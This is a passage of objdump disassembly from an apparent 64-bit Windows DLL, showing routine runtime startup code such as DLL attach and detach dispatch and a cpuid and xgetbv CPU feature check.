   18000487b:	48 83 c4 18          	add    $0x18,%rsp
   18000487f:	c3                   	ret
   180004880:	40 53                	rex push %rbx
   180004882:	48 83 ec 20          	sub    $0x20,%rsp
   180004886:	8a d9                	mov    %cl,%bl
   180004888:	e8 03 09 00 00       	call   0x180005190
   18000488d:	33 d2                	xor    %edx,%edx
   18000488f:	85 c0                	test   %eax,%eax
   180004891:	74 0b                	je     0x18000489e
   180004893:	84 db                	test   %bl,%bl
   180004895:	75 07                	jne    0x18000489e
   180004897:	48 87 15 aa 68 00 00 	xchg   %rdx,0x68aa(%rip)        # 0x18000b148
   18000489e:	48 83 c4 20          	add    $0x20,%rsp
   1800048a2:	5b                   	pop    %rbx
   1800048a3:	c3                   	ret
   1800048a4:	40 53                	rex push %rbx
   1800048a6:	48 83 ec 20          	sub    $0x20,%rsp
   1800048aa:	80 3d 9f 68 00 00 00 	cmpb   $0x0,0x689f(%rip)        # 0x18000b150
   1800048b1:	8a d9                	mov    %cl,%bl
   1800048b3:	74 04                	je     0x1800048b9
   1800048b5:	84 d2                	test   %dl,%dl
   1800048b7:	75 0c                	jne    0x1800048c5
   1800048b9:	e8 3e 0c 00 00       	call   0x1800054fc
   1800048be:	8a cb                	mov    %bl,%cl
   1800048c0:	e8 37 0c 00 00       	call   0x1800054fc
   1800048c5:	b0 01                	mov    $0x1,%al
   1800048c7:	48 83 c4 20          	add    $0x20,%rsp
   1800048cb:	5b                   	pop    %rbx
   1800048cc:	c3                   	ret
   1800048cd:	cc                   	int3
   1800048ce:	cc                   	int3
   1800048cf:	cc                   	int3
   1800048d0:	40 53                	rex push %rbx
   1800048d2:	48 83 ec 20          	sub    $0x20,%rsp
   1800048d6:	48 83 3d 7a 68 00 00 	cmpq   $0xffffffffffffffff,0x687a(%rip)        # 0x18000b158
   1800048dd:	ff 
   1800048de:	48 8b d9             	mov    %rcx,%rbx
   1800048e1:	75 07                	jne    0x1800048ea
   1800048e3:	e8 f4 0b 00 00       	call   0x1800054dc
   1800048e8:	eb 0f                	jmp    0x1800048f9
   1800048ea:	48 8b d3             	mov    %rbx,%rdx
   1800048ed:	48 8d 0d 64 68 00 00 	lea    0x6864(%rip),%rcx        # 0x18000b158
   1800048f4:	e8 d7 0b 00 00       	call   0x1800054d0
   1800048f9:	33 d2                	xor    %edx,%edx
   1800048fb:	85 c0                	test   %eax,%eax
   1800048fd:	48 0f 44 d3          	cmove  %rbx,%rdx
   180004901:	48 8b c2             	mov    %rdx,%rax
   180004904:	48 83 c4 20          	add    $0x20,%rsp
   180004908:	5b                   	pop    %rbx
   180004909:	c3                   	ret
   18000490a:	cc                   	int3
   18000490b:	cc                   	int3
   18000490c:	48 83 ec 28          	sub    $0x28,%rsp
   180004910:	e8 bb ff ff ff       	call   0x1800048d0
   180004915:	48 f7 d8             	neg    %rax
   180004918:	1b c0                	sbb    %eax,%eax
   18000491a:	f7 d8                	neg    %eax
   18000491c:	ff c8                	dec    %eax
   18000491e:	48 83 c4 28          	add    $0x28,%rsp
   180004922:	c3                   	ret
   180004923:	cc                   	int3
   180004924:	e9 cb 09 00 00       	jmp    0x1800052f4
   180004929:	cc                   	int3
   18000492a:	cc                   	int3
   18000492b:	cc                   	int3
   18000492c:	40 53                	rex push %rbx
   18000492e:	48 83 ec 20          	sub    $0x20,%rsp
   180004932:	48 8d 05 4f 3f 00 00 	lea    0x3f4f(%rip),%rax        # 0x180008888
   180004939:	48 8b d9             	mov    %rcx,%rbx
   18000493c:	48 89 01             	mov    %rax,(%rcx)
   18000493f:	f6 c2 01             	test   $0x1,%dl
   180004942:	74 0a                	je     0x18000494e
   180004944:	ba 18 00 00 00       	mov    $0x18,%edx
   180004949:	e8 d6 ff ff ff       	call   0x180004924
   18000494e:	48 8b c3             	mov    %rbx,%rax
   180004951:	48 83 c4 20          	add    $0x20,%rsp
   180004955:	5b                   	pop    %rbx
   180004956:	c3                   	ret
   180004957:	cc                   	int3
   180004958:	48 83 ec 28          	sub    $0x28,%rsp
   18000495c:	85 d2                	test   %edx,%edx
   18000495e:	74 39                	je     0x180004999
   180004960:	83 ea 01             	sub    $0x1,%edx
   180004963:	74 28                	je     0x18000498d
   180004965:	83 ea 01             	sub    $0x1,%edx
   180004968:	74 16                	je     0x180004980
   18000496a:	83 fa 01             	cmp    $0x1,%edx
   18000496d:	74 0a                	je     0x180004979
   18000496f:	b8 01 00 00 00       	mov    $0x1,%eax
   180004974:	48 83 c4 28          	add    $0x28,%rsp
   180004978:	c3                   	ret
   180004979:	e8 e6 fc ff ff       	call   0x180004664
   18000497e:	eb 05                	jmp    0x180004985
   180004980:	e8 b7 fc ff ff       	call   0x18000463c
   180004985:	0f b6 c0             	movzbl %al,%eax
   180004988:	48 83 c4 28          	add    $0x28,%rsp
   18000498c:	c3                   	ret
   18000498d:	49 8b d0             	mov    %r8,%rdx
   180004990:	48 83 c4 28          	add    $0x28,%rsp
   180004994:	e9 0f 00 00 00       	jmp    0x1800049a8
   180004999:	4d 85 c0             	test   %r8,%r8
   18000499c:	0f 95 c1             	setne  %cl
   18000499f:	48 83 c4 28          	add    $0x28,%rsp
   1800049a3:	e9 18 01 00 00       	jmp    0x180004ac0
   1800049a8:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800049ad:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1800049b2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1800049b7:	41 56                	push   %r14
   1800049b9:	48 83 ec 20          	sub    $0x20,%rsp
   1800049bd:	48 8b f2             	mov    %rdx,%rsi
   1800049c0:	4c 8b f1             	mov    %rcx,%r14
   1800049c3:	33 c9                	xor    %ecx,%ecx
   1800049c5:	e8 56 fd ff ff       	call   0x180004720
   1800049ca:	84 c0                	test   %al,%al
   1800049cc:	0f 84 c8 00 00 00    	je     0x180004a9a
   1800049d2:	e8 dd fb ff ff       	call   0x1800045b4
   1800049d7:	8a d8                	mov    %al,%bl
   1800049d9:	88 44 24 40          	mov    %al,0x40(%rsp)
   1800049dd:	40 b7 01             	mov    $0x1,%dil
   1800049e0:	83 3d 59 67 00 00 00 	cmpl   $0x0,0x6759(%rip)        # 0x18000b140
   1800049e7:	0f 85 c5 00 00 00    	jne    0x180004ab2
   1800049ed:	c7 05 49 67 00 00 01 	movl   $0x1,0x6749(%rip)        # 0x18000b140
   1800049f4:	00 00 00 
   1800049f7:	e8 28 fc ff ff       	call   0x180004624
   1800049fc:	84 c0                	test   %al,%al
   1800049fe:	74 4f                	je     0x180004a4f
   180004a00:	e8 ef 09 00 00       	call   0x1800053f4
   180004a05:	e8 a2 09 00 00       	call   0x1800053ac
   180004a0a:	e8 c1 09 00 00       	call   0x1800053d0
   180004a0f:	48 8d 15 fa 18 00 00 	lea    0x18fa(%rip),%rdx        # 0x180006310
   180004a16:	48 8d 0d eb 18 00 00 	lea    0x18eb(%rip),%rcx        # 0x180006308
   180004a1d:	e8 cc 0a 00 00       	call   0x1800054ee
   180004a22:	85 c0                	test   %eax,%eax
   180004a24:	75 29                	jne    0x180004a4f
   180004a26:	e8 c5 fb ff ff       	call   0x1800045f0
   180004a2b:	84 c0                	test   %al,%al
   180004a2d:	74 20                	je     0x180004a4f
   180004a2f:	48 8d 15 ca 18 00 00 	lea    0x18ca(%rip),%rdx        # 0x180006300
   180004a36:	48 8d 0d a3 18 00 00 	lea    0x18a3(%rip),%rcx        # 0x1800062e0
   180004a3d:	e8 a6 0a 00 00       	call   0x1800054e8
   180004a42:	c7 05 f4 66 00 00 02 	movl   $0x2,0x66f4(%rip)        # 0x18000b140
   180004a49:	00 00 00 
   180004a4c:	40 32 ff             	xor    %dil,%dil
   180004a4f:	8a cb                	mov    %bl,%cl
   180004a51:	e8 2a fe ff ff       	call   0x180004880
   180004a56:	40 84 ff             	test   %dil,%dil
   180004a59:	75 3f                	jne    0x180004a9a
   180004a5b:	e8 8c 09 00 00       	call   0x1800053ec
   180004a60:	48 8b d8             	mov    %rax,%rbx
   180004a63:	48 83 38 00          	cmpq   $0x0,(%rax)
   180004a67:	74 24                	je     0x180004a8d
   180004a69:	48 8b c8             	mov    %rax,%rcx
   180004a6c:	e8 77 fd ff ff       	call   0x1800047e8
   180004a71:	84 c0                	test   %al,%al
   180004a73:	74 18                	je     0x180004a8d
   180004a75:	4c 8b c6             	mov    %rsi,%r8
   180004a78:	ba 02 00 00 00       	mov    $0x2,%edx
   180004a7d:	49 8b ce             	mov    %r14,%rcx
   180004a80:	48 8b 03             	mov    (%rbx),%rax
   180004a83:	4c 8b 0d 2e 18 00 00 	mov    0x182e(%rip),%r9        # 0x1800062b8
   180004a8a:	41 ff d1             	call   *%r9
   180004a8d:	ff 05 f5 66 00 00    	incl   0x66f5(%rip)        # 0x18000b188
   180004a93:	b8 01 00 00 00       	mov    $0x1,%eax
   180004a98:	eb 02                	jmp    0x180004a9c
   180004a9a:	33 c0                	xor    %eax,%eax
   180004a9c:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004aa1:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004aa6:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   180004aab:	48 83 c4 20          	add    $0x20,%rsp
   180004aaf:	41 5e                	pop    %r14
   180004ab1:	c3                   	ret
   180004ab2:	b9 07 00 00 00       	mov    $0x7,%ecx
   180004ab7:	e8 ec 06 00 00       	call   0x1800051a8
   180004abc:	90                   	nop
   180004abd:	cc                   	int3
   180004abe:	cc                   	int3
   180004abf:	cc                   	int3
   180004ac0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004ac5:	57                   	push   %rdi
   180004ac6:	48 83 ec 30          	sub    $0x30,%rsp
   180004aca:	40 8a f9             	mov    %cl,%dil
   180004acd:	8b 05 b5 66 00 00    	mov    0x66b5(%rip),%eax        # 0x18000b188
   180004ad3:	85 c0                	test   %eax,%eax
   180004ad5:	7f 0d                	jg     0x180004ae4
   180004ad7:	33 c0                	xor    %eax,%eax
   180004ad9:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   180004ade:	48 83 c4 30          	add    $0x30,%rsp
   180004ae2:	5f                   	pop    %rdi
   180004ae3:	c3                   	ret
   180004ae4:	ff c8                	dec    %eax
   180004ae6:	89 05 9c 66 00 00    	mov    %eax,0x669c(%rip)        # 0x18000b188
   180004aec:	e8 c3 fa ff ff       	call   0x1800045b4
   180004af1:	8a d8                	mov    %al,%bl
   180004af3:	88 44 24 20          	mov    %al,0x20(%rsp)
   180004af7:	83 3d 42 66 00 00 02 	cmpl   $0x2,0x6642(%rip)        # 0x18000b140
   180004afe:	75 36                	jne    0x180004b36
   180004b00:	e8 d7 fb ff ff       	call   0x1800046dc
   180004b05:	e8 b2 08 00 00       	call   0x1800053bc
   180004b0a:	e8 21 09 00 00       	call   0x180005430
   180004b0f:	c7 05 27 66 00 00 00 	movl   $0x0,0x6627(%rip)        # 0x18000b140
   180004b16:	00 00 00 
   180004b19:	8a cb                	mov    %bl,%cl
   180004b1b:	e8 60 fd ff ff       	call   0x180004880
   180004b20:	33 d2                	xor    %edx,%edx
   180004b22:	40 8a cf             	mov    %dil,%cl
   180004b25:	e8 7a fd ff ff       	call   0x1800048a4
   180004b2a:	0f b6 d8             	movzbl %al,%ebx
   180004b2d:	e8 da fb ff ff       	call   0x18000470c
   180004b32:	8b c3                	mov    %ebx,%eax
   180004b34:	eb a3                	jmp    0x180004ad9
   180004b36:	b9 07 00 00 00       	mov    $0x7,%ecx
   180004b3b:	e8 68 06 00 00       	call   0x1800051a8
   180004b40:	90                   	nop
   180004b41:	90                   	nop
   180004b42:	cc                   	int3
   180004b43:	cc                   	int3
   180004b44:	48 8b c4             	mov    %rsp,%rax
   180004b47:	48 89 58 20          	mov    %rbx,0x20(%rax)
   180004b4b:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180004b4f:	89 50 10             	mov    %edx,0x10(%rax)
   180004b52:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180004b56:	56                   	push   %rsi
   180004b57:	57                   	push   %rdi
   180004b58:	41 56                	push   %r14
   180004b5a:	48 83 ec 40          	sub    $0x40,%rsp
   180004b5e:	49 8b f0             	mov    %r8,%rsi
   180004b61:	8b fa                	mov    %edx,%edi
   180004b63:	4c 8b f1             	mov    %rcx,%r14
   180004b66:	85 d2                	test   %edx,%edx
   180004b68:	75 0f                	jne    0x180004b79
   180004b6a:	39 15 18 66 00 00    	cmp    %edx,0x6618(%rip)        # 0x18000b188
   180004b70:	7f 07                	jg     0x180004b79
   180004b72:	33 c0                	xor    %eax,%eax
   180004b74:	e9 e5 00 00 00       	jmp    0x180004c5e
   180004b79:	8d 42 ff             	lea    -0x1(%rdx),%eax
   180004b7c:	83 f8 01             	cmp    $0x1,%eax
   180004b7f:	77 40                	ja     0x180004bc1
   180004b81:	48 8b 05 08 3d 00 00 	mov    0x3d08(%rip),%rax        # 0x180008890
   180004b88:	48 85 c0             	test   %rax,%rax
   180004b8b:	75 05                	jne    0x180004b92
   180004b8d:	8d 58 01             	lea    0x1(%rax),%ebx
   180004b90:	eb 08                	jmp    0x180004b9a
   180004b92:	ff 15 20 17 00 00    	call   *0x1720(%rip)        # 0x1800062b8
   180004b98:	8b d8                	mov    %eax,%ebx
   180004b9a:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180004b9e:	85 db                	test   %ebx,%ebx
   180004ba0:	0f 84 ae 00 00 00    	je     0x180004c54
   180004ba6:	4c 8b c6             	mov    %rsi,%r8
   180004ba9:	8b d7                	mov    %edi,%edx
   180004bab:	49 8b ce             	mov    %r14,%rcx
   180004bae:	e8 a5 fd ff ff       	call   0x180004958
   180004bb3:	8b d8                	mov    %eax,%ebx
   180004bb5:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004bb9:	85 c0                	test   %eax,%eax
   180004bbb:	0f 84 93 00 00 00    	je     0x180004c54
   180004bc1:	4c 8b c6             	mov    %rsi,%r8
   180004bc4:	8b d7                	mov    %edi,%edx
   180004bc6:	49 8b ce             	mov    %r14,%rcx
   180004bc9:	e8 c2 d5 ff ff       	call   0x180002190
   180004bce:	8b d8                	mov    %eax,%ebx
   180004bd0:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004bd4:	83 ff 01             	cmp    $0x1,%edi
   180004bd7:	75 36                	jne    0x180004c0f
   180004bd9:	85 c0                	test   %eax,%eax
   180004bdb:	75 32                	jne    0x180004c0f
   180004bdd:	4c 8b c6             	mov    %rsi,%r8
   180004be0:	33 d2                	xor    %edx,%edx
   180004be2:	49 8b ce             	mov    %r14,%rcx
   180004be5:	e8 a6 d5 ff ff       	call   0x180002190
   180004bea:	48 85 f6             	test   %rsi,%rsi
   180004bed:	0f 95 c1             	setne  %cl
   180004bf0:	e8 cb fe ff ff       	call   0x180004ac0
   180004bf5:	48 8b 05 94 3c 00 00 	mov    0x3c94(%rip),%rax        # 0x180008890
   180004bfc:	48 85 c0             	test   %rax,%rax
   180004bff:	74 0e                	je     0x180004c0f
   180004c01:	4c 8b c6             	mov    %rsi,%r8
   180004c04:	33 d2                	xor    %edx,%edx
   180004c06:	49 8b ce             	mov    %r14,%rcx
   180004c09:	ff 15 a9 16 00 00    	call   *0x16a9(%rip)        # 0x1800062b8
   180004c0f:	85 ff                	test   %edi,%edi
   180004c11:	74 05                	je     0x180004c18
   180004c13:	83 ff 03             	cmp    $0x3,%edi
   180004c16:	75 3c                	jne    0x180004c54
   180004c18:	4c 8b c6             	mov    %rsi,%r8
   180004c1b:	8b d7                	mov    %edi,%edx
   180004c1d:	49 8b ce             	mov    %r14,%rcx
   180004c20:	e8 33 fd ff ff       	call   0x180004958
   180004c25:	8b d8                	mov    %eax,%ebx
   180004c27:	89 44 24 30          	mov    %eax,0x30(%rsp)
   180004c2b:	85 c0                	test   %eax,%eax
   180004c2d:	74 25                	je     0x180004c54
   180004c2f:	48 8b 05 5a 3c 00 00 	mov    0x3c5a(%rip),%rax        # 0x180008890
   180004c36:	48 85 c0             	test   %rax,%rax
   180004c39:	75 05                	jne    0x180004c40
   180004c3b:	8d 58 01             	lea    0x1(%rax),%ebx
   180004c3e:	eb 10                	jmp    0x180004c50
   180004c40:	4c 8b c6             	mov    %rsi,%r8
   180004c43:	8b d7                	mov    %edi,%edx
   180004c45:	49 8b ce             	mov    %r14,%rcx
   180004c48:	ff 15 6a 16 00 00    	call   *0x166a(%rip)        # 0x1800062b8
   180004c4e:	8b d8                	mov    %eax,%ebx
   180004c50:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180004c54:	eb 06                	jmp    0x180004c5c
   180004c56:	33 db                	xor    %ebx,%ebx
   180004c58:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180004c5c:	8b c3                	mov    %ebx,%eax
   180004c5e:	48 8b 5c 24 78       	mov    0x78(%rsp),%rbx
   180004c63:	48 83 c4 40          	add    $0x40,%rsp
   180004c67:	41 5e                	pop    %r14
   180004c69:	5f                   	pop    %rdi
   180004c6a:	5e                   	pop    %rsi
   180004c6b:	c3                   	ret
   180004c6c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180004c71:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   180004c76:	57                   	push   %rdi
   180004c77:	48 83 ec 20          	sub    $0x20,%rsp
   180004c7b:	49 8b f8             	mov    %r8,%rdi
   180004c7e:	8b da                	mov    %edx,%ebx
   180004c80:	48 8b f1             	mov    %rcx,%rsi
   180004c83:	83 fa 01             	cmp    $0x1,%edx
   180004c86:	75 05                	jne    0x180004c8d
   180004c88:	e8 6f 06 00 00       	call   0x1800052fc
   180004c8d:	4c 8b c7             	mov    %rdi,%r8
   180004c90:	8b d3                	mov    %ebx,%edx
   180004c92:	48 8b ce             	mov    %rsi,%rcx
   180004c95:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180004c9a:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   180004c9f:	48 83 c4 20          	add    $0x20,%rsp
   180004ca3:	5f                   	pop    %rdi
   180004ca4:	e9 9b fe ff ff       	jmp    0x180004b44
   180004ca9:	cc                   	int3
   180004caa:	cc                   	int3
   180004cab:	cc                   	int3
   180004cac:	48 83 ec 28          	sub    $0x28,%rsp
   180004cb0:	4d 8b 41 38          	mov    0x38(%r9),%r8
   180004cb4:	48 8b ca             	mov    %rdx,%rcx
   180004cb7:	49 8b d1             	mov    %r9,%rdx
   180004cba:	e8 0d 00 00 00       	call   0x180004ccc
   180004cbf:	b8 01 00 00 00       	mov    $0x1,%eax
   180004cc4:	48 83 c4 28          	add    $0x28,%rsp
   180004cc8:	c3                   	ret
   180004cc9:	cc                   	int3
   180004cca:	cc                   	int3
   180004ccb:	cc                   	int3
   180004ccc:	40 53                	rex push %rbx
   180004cce:	45 8b 18             	mov    (%r8),%r11d
   180004cd1:	48 8b da             	mov    %rdx,%rbx
   180004cd4:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   180004cd8:	4c 8b c9             	mov    %rcx,%r9
   180004cdb:	41 f6 00 04          	testb  $0x4,(%r8)
   180004cdf:	4c 8b d1             	mov    %rcx,%r10
   180004ce2:	74 13                	je     0x180004cf7
   180004ce4:	41 8b 40 08          	mov    0x8(%r8),%eax
   180004ce8:	4d 63 50 04          	movslq 0x4(%r8),%r10
   180004cec:	f7 d8                	neg    %eax
   180004cee:	4c 03 d1             	add    %rcx,%r10
   180004cf1:	48 63 c8             	movslq %eax,%rcx
   180004cf4:	4c 23 d1             	and    %rcx,%r10
   180004cf7:	49 63 c3             	movslq %r11d,%rax
   180004cfa:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   180004cfe:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180004d02:	8b 48 08             	mov    0x8(%rax),%ecx
   180004d05:	48 8b 43 08          	mov    0x8(%rbx),%rax
   180004d09:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   180004d0e:	74 10                	je     0x180004d20
   180004d10:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   180004d15:	b9 f0 ff ff ff       	mov    $0xfffffff0,%ecx
   180004d1a:	48 23 c1             	and    %rcx,%rax
   180004d1d:	4c 03 c8             	add    %rax,%r9
   180004d20:	4c 33 ca             	xor    %rdx,%r9
   180004d23:	49 8b c9             	mov    %r9,%rcx
   180004d26:	5b                   	pop    %rbx
   180004d27:	e9 64 f7 ff ff       	jmp    0x180004490
   180004d2c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180004d31:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   180004d36:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   180004d3b:	57                   	push   %rdi
   180004d3c:	48 83 ec 10          	sub    $0x10,%rsp
   180004d40:	33 c0                	xor    %eax,%eax
   180004d42:	33 c9                	xor    %ecx,%ecx
   180004d44:	0f a2                	cpuid
   180004d46:	81 f1 6e 74 65 6c    	xor    $0x6c65746e,%ecx
   180004d4c:	81 f2 69 6e 65 49    	xor    $0x49656e69,%edx
   180004d52:	0b d1                	or     %ecx,%edx
   180004d54:	8b e8                	mov    %eax,%ebp
   180004d56:	b8 01 00 00 00       	mov    $0x1,%eax
   180004d5b:	81 f3 47 65 6e 75    	xor    $0x756e6547,%ebx
   180004d61:	0b d3                	or     %ebx,%edx
   180004d63:	8d 48 ff             	lea    -0x1(%rax),%ecx
   180004d66:	0f a2                	cpuid
   180004d68:	8b f9                	mov    %ecx,%edi
   180004d6a:	75 5e                	jne    0x180004dca
   180004d6c:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   180004d71:	48 c7 05 9c 62 00 00 	movq   $0x8000,0x629c(%rip)        # 0x18000b018
   180004d78:	00 80 00 00 
   180004d7c:	48 c7 05 99 62 00 00 	movq   $0xffffffffffffffff,0x6299(%rip)        # 0x18000b020
   180004d83:	ff ff ff ff 
   180004d87:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   180004d8c:	74 28                	je     0x180004db6
   180004d8e:	3d 60 06 02 00       	cmp    $0x20660,%eax
   180004d93:	74 21                	je     0x180004db6
   180004d95:	3d 70 06 02 00       	cmp    $0x20670,%eax
   180004d9a:	74 1a                	je     0x180004db6
   180004d9c:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   180004da1:	83 f8 20             	cmp    $0x20,%eax
   180004da4:	77 24                	ja     0x180004dca
   180004da6:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   180004dad:	00 00 00 
   180004db0:	48 0f a3 c1          	bt     %rax,%rcx
   180004db4:	73 14                	jae    0x180004dca
   180004db6:	44 8b 05 d3 63 00 00 	mov    0x63d3(%rip),%r8d        # 0x18000b190
   180004dbd:	41 83 c8 01          	or     $0x1,%r8d
   180004dc1:	44 89 05 c8 63 00 00 	mov    %r8d,0x63c8(%rip)        # 0x18000b190
   180004dc8:	eb 07                	jmp    0x180004dd1
   180004dca:	44 8b 05 bf 63 00 00 	mov    0x63bf(%rip),%r8d        # 0x18000b190
   180004dd1:	45 33 c9             	xor    %r9d,%r9d
   180004dd4:	41 8b f1             	mov    %r9d,%esi
   180004dd7:	45 8b d1             	mov    %r9d,%r10d
   180004dda:	45 8b d9             	mov    %r9d,%r11d
   180004ddd:	83 fd 07             	cmp    $0x7,%ebp
   180004de0:	7c 40                	jl     0x180004e22
   180004de2:	41 8d 41 07          	lea    0x7(%r9),%eax
   180004de6:	33 c9                	xor    %ecx,%ecx
   180004de8:	0f a2                	cpuid
   180004dea:	8b f2                	mov    %edx,%esi
   180004dec:	44 8b cb             	mov    %ebx,%r9d
   180004def:	0f ba e3 09          	bt     $0x9,%ebx
   180004df3:	73 0b                	jae    0x180004e00
   180004df5:	41 83 c8 02          	or     $0x2,%r8d
   180004df9:	44 89 05 90 63 00 00 	mov    %r8d,0x6390(%rip)        # 0x18000b190
   180004e00:	83 f8 01             	cmp    $0x1,%eax
   180004e03:	7c 0d                	jl     0x180004e12
   180004e05:	b8 07 00 00 00       	mov    $0x7,%eax
   180004e0a:	8d 48 fa             	lea    -0x6(%rax),%ecx
   180004e0d:	0f a2                	cpuid
   180004e0f:	44 8b d2             	mov    %edx,%r10d
   180004e12:	b8 24 00 00 00       	mov    $0x24,%eax
   180004e17:	3b e8                	cmp    %eax,%ebp
   180004e19:	7c 07                	jl     0x180004e22
   180004e1b:	33 c9                	xor    %ecx,%ecx
   180004e1d:	0f a2                	cpuid
   180004e1f:	44 8b db             	mov    %ebx,%r11d
   180004e22:	48 8b 05 df 61 00 00 	mov    0x61df(%rip),%rax        # 0x18000b008
   180004e29:	48 83 e0 fe          	and    $0xfffffffffffffffe,%rax
   180004e2d:	c7 05 d9 61 00 00 01 	movl   $0x1,0x61d9(%rip)        # 0x18000b010
   180004e34:	00 00 00 
   180004e37:	c7 05 d3 61 00 00 02 	movl   $0x2,0x61d3(%rip)        # 0x18000b014
   180004e3e:	00 00 00 
   180004e41:	48 89 05 c0 61 00 00 	mov    %rax,0x61c0(%rip)        # 0x18000b008
   180004e48:	0f ba e7 14          	bt     $0x14,%edi
   180004e4c:	73 1f                	jae    0x180004e6d
   180004e4e:	48 83 e0 ef          	and    $0xffffffffffffffef,%rax
   180004e52:	c7 05 b4 61 00 00 02 	movl   $0x2,0x61b4(%rip)        # 0x18000b010
   180004e59:	00 00 00 
   180004e5c:	48 89 05 a5 61 00 00 	mov    %rax,0x61a5(%rip)        # 0x18000b008
   180004e63:	c7 05 a7 61 00 00 06 	movl   $0x6,0x61a7(%rip)        # 0x18000b014
   180004e6a:	00 00 00 
   180004e6d:	0f ba e7 1b          	bt     $0x1b,%edi
   180004e71:	0f 83 33 01 00 00    	jae    0x180004faa
   180004e77:	33 c9                	xor    %ecx,%ecx
   180004e79:	0f 01 d0             	xgetbv
   180004e7c:	48 c1 e2 20          	shl    $0x20,%rdx
   180004e80:	48 0b d0             	or     %rax,%rdx
   180004e83:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   180004e88:	0f ba e7 1c          	bt     $0x1c,%edi
   180004e8c:	0f 83 fc 00 00 00    	jae    0x180004f8e
   180004e92:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180004e97:	24 06                	and    $0x6,%al
   180004e99:	3c 06                	cmp    $0x6,%al
   180004e9b:	0f 85 ed 00 00 00    	jne    0x180004f8e
   180004ea1:	8b 05 6d 61 00 00    	mov    0x616d(%rip),%eax        # 0x18000b014
   180004ea7:	b2 e0                	mov    $0xe0,%dl
   180004ea9:	83 c8 08             	or     $0x8,%eax
   180004eac:	c7 05 5a 61 00 00 03 	movl   $0x3,0x615a(%rip)        # 0x18000b010
   180004eb3:	00 00 00 
   180004eb6:	89 05 58 61 00 00    	mov    %eax,0x6158(%rip)        # 0x18000b014
   180004ebc:	41 f6 c1 20          	test   $0x20,%r9b
   180004ec0:	74 62                	je     0x180004f24
   180004ec2:	83 c8 20             	or     $0x20,%eax
   180004ec5:	c7 05 41 61 00 00 05 	movl   $0x5,0x6141(%rip)        # 0x18000b010
   180004ecc:	00 00 00 
   180004ecf:	89 05 3f 61 00 00    	mov    %eax,0x613f(%rip)        # 0x18000b014
   180004ed5:	b9 00 00 03 d0       	mov    $0xd0030000,%ecx
   180004eda:	48 8b 05 27 61 00 00 	mov    0x6127(%rip),%rax        # 0x18000b008
   180004ee1:	44 23 c9             	and    %ecx,%r9d
   180004ee4:	48 83 e0 fd          	and    $0xfffffffffffffffd,%rax
   180004ee8:	48 89 05 19 61 00 00 	mov    %rax,0x6119(%rip)        # 0x18000b008
   180004eef:	44 3b c9             	cmp    %ecx,%r9d
   180004ef2:	75 37                	jne    0x180004f2b
   180004ef4:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180004ef9:	22 c2                	and    %dl,%al
   180004efb:	3a c2                	cmp    %dl,%al
   180004efd:	75 25                	jne    0x180004f24
   180004eff:	48 8b 05 02 61 00 00 	mov    0x6102(%rip),%rax        # 0x18000b008
   180004f06:	83 0d 07 61 00 00 40 	orl    $0x40,0x6107(%rip)        # 0x18000b014
   180004f0d:	48 83 e0 db          	and    $0xffffffffffffffdb,%rax
   180004f11:	c7 05 f5 60 00 00 06 	movl   $0x6,0x60f5(%rip)        # 0x18000b010
   180004f18:	00 00 00 
   180004f1b:	48 89 05 e6 60 00 00 	mov    %rax,0x60e6(%rip)        # 0x18000b008
   180004f22:	eb 07                	jmp    0x180004f2b
   180004f24:	48 8b 05 dd 60 00 00 	mov    0x60dd(%rip),%rax        # 0x18000b008
   180004f2b:	0f ba e6 17          	bt     $0x17,%esi
   180004f2f:	73 0c                	jae    0x180004f3d
   180004f31:	48 0f ba f0 18       	btr    $0x18,%rax
   180004f36:	48 89 05 cb 60 00 00 	mov    %rax,0x60cb(%rip)        # 0x18000b008
   180004f3d:	41 0f ba e2 13       	bt     $0x13,%r10d
   180004f42:	73 4a                	jae    0x180004f8e
   180004f44:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   180004f49:	22 c2                	and    %dl,%al
   180004f4b:	3a c2                	cmp    %dl,%al
   180004f4d:	75 3f                	jne    0x180004f8e
   180004f4f:	41 8b cb             	mov    %r11d,%ecx
   180004f52:	41 8b c3             	mov    %r11d,%eax
   180004f55:	48 c1 e9 10          	shr    $0x10,%rcx
   180004f59:	25 ff 00 04 00       	and    $0x400ff,%eax
   180004f5e:	83 e1 06             	and    $0x6,%ecx
   180004f61:	89 05 25 62 00 00    	mov    %eax,0x6225(%rip)        # 0x18000b18c
   180004f67:	48 81 c9 29 00 00 01 	or     $0x1000029,%rcx
   180004f6e:	48 f7 d1             	not    %rcx
   180004f71:	48 23 0d 90 60 00 00 	and    0x6090(%rip),%rcx        # 0x18000b008
